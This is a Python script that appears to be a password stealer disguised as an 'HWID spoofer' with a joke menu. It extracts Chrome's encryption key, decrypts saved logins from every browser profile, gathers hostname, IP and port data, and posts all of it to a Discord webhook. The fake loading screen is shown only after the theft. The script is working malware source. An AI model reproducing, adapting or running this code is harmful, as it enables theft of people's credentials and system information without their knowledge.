import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
import shutil
import os
import re
import requests
import discord
import time
import socket
from Cryptodome.Cipher import AES




def fakeMessage():
    logo = ("""\033[1;36;40m
    ╭━━━╮╱╱╱╱╱╱╱╱╱╭━╮╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
    ┃╭━╮┃╱╱╱╱╱╱╱╱╱┃╭╯╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
    ┃╰━━┳━━┳━━┳━━┳╯╰┳┳━╮╭━━╮╰╯┃┃┣┻━┳━━┫┃
    ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭╋┫╭╮┫╭╮┃╱╱┃┃┃╭╮┃╭╮┃┃
    ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃┃┃┃╰╯┃╱╱┃┃┃╰╯┃╰╯┃╰╮
    ╰━━━┫╭━┻━━┻━━╯╰╯╰┻╯╰┻━╮┃╱╱╰╯╰━━┻━━┻━╯
    ╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
    ╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯by SSIDSpin""")
    os.system('cls||clear')
    print(logo)
    i=0.5
    while i < 4:
        print("Loading" + "." * int(i))
        time.sleep(i)
        i += 1
    os.system('cls||clear')
    print(logo)
    print("""\nSelect Option (Use Numbers To Make A Choice)
    1 -> Spoof HWID
    2 -> Find GF
    3 -> Hack Nasa
    4 -> Obtain A Life
    """)
    option = input()
    print("Option " + option +" Selected Starting Spoofing HWID Now")
    #Fake Bar
    time.sleep(999)



CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
Webhook = ""
Wallets = None
PCName = os.environ.get( " USERNAME" )
PortList = []

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def send_to_discord(webhook_url, content=None, embed=None):
    data = {}
    if content:
        data["content"] = content
    if embed:
        data["embeds"] = [embed.to_dict()]
    
    headers = {"Content-Type": "application/json"}
    response = requests.post(webhook_url, headers=headers, data=json.dumps(data))

    if response.status_code != 204:
        raise Exception(f"Failed to send message to Discord webhook: {response.status_code}, {response.text}")
    

ip = socket.gethostbyname(socket.gethostname())
for port in range(65535):
    try:
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv.bind((ip, port))
        serv.close()
    except:
        PortList.append(port)
ports_string = ', '.join(map(str, PortList))
    


def findwallets():
    if 1+1 == 2:
        Wallets == "1"
        #Find Hardware Wallets
        return True
    else:
        Wallets == "None"
        return False
    






if __name__ == '__main__':
    try:
        with open('LatestLog.txt', mode='w', encoding='utf-8') as decrypt_password_file:
            secret_key = get_secret_key()
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            PCInfo=discord.Embed(
                title =f"{hostname} PC Stats",
            )
            PCInfo.add_field(name="**:mechanic: Host Name**:", value=f"{hostname}", inline=True)
            PCInfo.add_field(name="**:computer: IP Address**:", value=f"{ip_address}", inline=True)
            PCInfo.add_field(name="**:map: Open Ports**:", value=f"{ports_string}", inline=False)
            PCInfo.add_field(name="**:moneybag: Crypto Wallets Available:**", value=f"{Wallets}", inline=False)
            if findwallets == True:
                PharseKey=discord.Embed(
                    title= f"{hostname} Crypto Wallet Details",
                    description= "File Upload Link View:",
                    colour=0x008000
                )

            send_to_discord(Webhook, embed=PCInfo)

            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            all_logins = ""

            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
    
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
            
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            all_logins += f"**URL**: ```{url}```\n**User Login**: ```{username}```\n**Password**: ```{decrypted_password}```\n\n"
        
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")


            if all_logins:
                ChromeData = discord.Embed(
                title = f"{hostname} Chrome Saved Passwords",
                description = all_logins,
                colour = 0x008000
            )
            send_to_discord(Webhook, embed=ChromeData)
            fakeMessage()

    except Exception as e:
        print(f"[ERR] {str(e)}")